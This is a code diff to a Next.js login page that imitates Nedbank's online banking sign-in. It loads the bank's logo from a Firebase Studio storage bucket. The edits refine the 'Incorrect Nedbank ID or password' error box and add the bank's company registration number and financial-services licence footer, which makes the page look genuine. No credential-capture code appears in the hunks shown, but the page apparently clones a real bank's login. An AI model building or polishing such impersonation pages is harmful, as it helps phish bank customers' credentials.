@@ -79,7 +79,8 @@ export default function LoginPage() {
             router.push('/dashboard');
         }
     } catch (error: any) {
-         console.error('Sign-in failed:', error);
+         // Log for debugging but handle through state to avoid unhandled runtime error overlay
+         console.warn('Sign-in attempt failed:', error.code);
          setErrorMessage('Incorrect Nedbank ID or password. Please try again.');
     } finally {
         setIsLoading(false);
@@ -88,7 +89,7 @@ export default function LoginPage() {
 
   return (
     <div className="flex flex-col h-screen bg-white">
-      <header className="flex items-center justify-between px-4 py-3 bg-white">
+      <header className="flex items-center justify-between px-4 py-3 bg-white shrink-0">
         <Image
           src="https://firebasestorage.googleapis.com/v0/b/studio-3883937532-b7f00.firebasestorage.app/o/NED.JO.png?alt=media&token=990d35fb-2ebf-42c4-988e-78999a4e09d7"
           alt="Nedbank Logo"
@@ -157,17 +158,24 @@ export default function LoginPage() {
           </>
         )}
 
-        <div className="flex items-center justify-center gap-2 mt-2" aria-live="polite" aria-atomic="true">
+        <div className="flex items-center justify-center gap-2 mt-4" aria-live="polite" aria-atomic="true">
           {errorMessage && !isLoading && (
-            <>
-              <AlertCircle className="h-5 w-5 text-red-500" />
-              <p className="text-sm text-red-500">{errorMessage}</p>
-            </>
+            <div className="flex items-center gap-2 text-red-500 bg-red-50 p-3 rounded-lg border border-red-100 w-full justify-center">
+              <AlertCircle className="h-5 w-5" />
+              <p className="text-sm font-medium">{errorMessage}</p>
+            </div>
           )}
+        </div>
+
+        <div className="mt-8 text-center pb-6">
+          <p className="text-[10px] text-gray-400 uppercase leading-relaxed tracking-wider">
+            Nedbank Ltd Reg No 1951/000009/06.<br />
+            Licensed financial services provider (FSP9363)
+          </p>
         </div>
       </main>
 
-      <footer className="border-t bg-white py-2 px-2">
+      <footer className="border-t bg-white py-2 px-2 shrink-0">
         <div className="flex justify-around items-center">
           <BottomNavItem icon={LayoutGrid} label="Latest" />
           <BottomNavItem icon={Lock} label="Login" active />
